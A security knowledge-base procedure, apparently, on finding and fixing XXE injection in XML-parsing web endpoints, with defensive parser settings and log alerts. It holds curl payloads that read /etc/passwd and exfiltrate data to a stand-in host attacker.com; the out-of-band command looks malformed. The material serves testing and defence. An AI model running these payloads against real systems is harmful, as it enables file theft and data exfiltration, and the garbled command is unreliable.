---
id: 108b8126-60b8-467a-b037-6c003a25c413
name: Detect-and-Mitigate-XXE-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:44.099165+00:00'
updated_at: '2023-04-10T20:24:39.916950+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Spearphishing Link|T1566.001 - Phishing: Spearphishing
    Attachment]]
  - '[[techniques/Template Injection|T1221 - Template Injection]]'
sub_techniques: []
tags:
  - xxe
  - detection
  - mitigation
  - xml-injection
commands:
  - '[[commands/curl-send-basic-xxe-payload]]'
  - '[[commands/curl-send-out-of-band-xxe-payload]]'
platforms:
  - Web
tools: []
validated: true
---

# Detect-and-Mitigate-XXE-Injection

## Summary

This procedure outlines how to detect XML External Entity (XXE) injection vulnerabilities in web applications that parse XML input and provides mitigation strategies to prevent exploitation. XXE allows attackers to read local files, perform server-side request forgery, or cause denial-of-service by abusing external entity declarations in XML parsers.

## Description

XML External Entity Injection exploits weakly configured XML parsers to process malicious external entities, potentially leading to data disclosure (e.g., /etc/passwd), remote code execution via SSRF, or resource exhaustion (e.g., billion laughs attack). This procedure focuses on testing public-facing endpoints that accept XML data, such as APIs or file uploads. Detection involves crafting payloads to trigger entity expansion and observing responses for leaked data. Mitigation includes disabling external entity processing in the parser (e.g., libxml2) and validating/sanitizing XML input. Target environments include web applications on Linux/Windows servers using parsers like PHP's SimpleXML, Java's SAX, or .NET's XmlReader.

## Requirements

1. Network access to the target application endpoint accepting XML input (e.g., POST /api/upload).
2. Tools like curl for sending HTTP requests or Burp Suite for interception and modification.
3. Basic knowledge of XML structure and HTTP protocols.
4. For mitigation, access to application source code or server configuration.

## Defense

- Disable external entity resolution in XML parsers (e.g., set libxml_disable_entity_loader(true) in PHP, or use secure processing in Java).
- Implement strict input validation to reject or sanitize XML payloads, using whitelisting for allowed elements.
- Use web application firewalls (WAF) to block common XXE patterns like <!ENTITY> declarations.
- Monitor logs for anomalous file access or outbound requests indicative of XXE exploitation.

## Objectives

1. Identify if the XML parser processes external entities, confirming vulnerability.
2. Demonstrate potential impact, such as file disclosure or SSRF.
3. Apply mitigations to secure the parser against future attacks.
4. Verify that mitigations prevent payload execution.

## Instructions

### Step 1: Test for Basic XXE with Local File Disclosure

**Context**: Send a simple XXE payload to check if the parser expands external entities to read local files. This step targets in-band disclosure where sensitive data appears in the response.

**Command** ([[commands/curl-send-basic-xxe-payload]]):
```bash
curl -X POST http://target.com/api/xml-endpoint -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

> This command sends an XML payload defining an external entity 'xxe' that reads /etc/passwd. If vulnerable, the response will include the file's contents (e.g., root:x:0:0:root...). On Windows, use 'file:///C:/Windows/win.ini'. If no disclosure, proceed to out-of-band testing.

### Step 2: Test for Out-of-Band XXE via SSRF

**Context**: If in-band fails, test for blind XXE by exfiltrating data to an attacker-controlled server. This confirms vulnerability even if data isn't reflected in the response.

**Command** ([[commands/curl-send-out-of-band-xxe-payload]]):
```bash
curl -X POST http://target.com/api/xml-endpoint -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>' --data "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;"> %eval; %exfil;"> ]><foo>&file;</foo>"
```

> First, host an evil.dtd on attacker.com to parameterize the entity. The payload triggers an HTTP request to your server with exfiltrated data (e.g., file contents in query param). Monitor your server logs for incoming requests. Success is confirmed by received data.

### Step 3: Verify and Mitigate the Vulnerability

**Context**: If tests confirm XXE, implement mitigations and re-test to ensure resolution. This involves code changes or configuration updates.

**Instructions**: Update the XML parser configuration to disable DTD processing and external entities. For example, in PHP: libxml_disable_entity_loader(true);. Re-run Step 1 and 2 payloads; expect parsing errors or no entity expansion. Log parser errors to confirm rejection of <!DOCTYPE> declarations.

**Expected Output**: Error responses like "DTD forbidden" or empty responses without leaked data.

### Step 4: Monitor for Exploitation Attempts

**Context**: Post-mitigation, set up logging to detect residual or new XXE attempts.

**Instructions**: Configure application logs to capture XML input and parser events. Use tools like ELK stack to alert on keywords like "<!ENTITY" or "SYSTEM" in payloads.

**Expected Output**: Alerts triggered on suspicious XML inputs, allowing rapid response.
